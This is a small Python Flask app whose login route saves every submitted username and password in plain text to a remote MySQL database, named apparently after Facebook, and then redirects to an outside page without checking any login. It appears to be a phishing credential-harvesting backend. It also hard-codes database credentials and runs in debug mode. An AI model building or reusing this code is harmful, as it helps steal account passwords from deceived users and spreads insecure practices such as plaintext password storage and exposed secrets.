from flask import Flask, request, redirect, render_template
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Update the database URI with the provided credentials
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://facebook_blindcity:59257e84d141d92bd5434c4f9c800c6ea897ef0f@cxr.h.filess.io:3307/facebook_blindcity'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class User(db.Model):
    __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            
            # Create a new User instance with plain text password
            new_user = User(username=username, password=password)
            
            # Add the new user to the session
            db.session.add(new_user)
            
            # Commit the session to save the new user to the database
            db.session.commit()
            
            # Redirect to a success page or do further processing
            return redirect('https://www.example.com/success')

        return "Method not allowed", 405  # Handle other HTTP methods if necessary

    except Exception as e:
        # Log the exception
        print(f"An error occurred: {str(e)}")
        # Rollback the session if there's an error
        db.session.rollback()
        return f"An error occurred while processing your request: {str(e)}", 500

if __name__ == '__main__':
    app.run(debug=True)
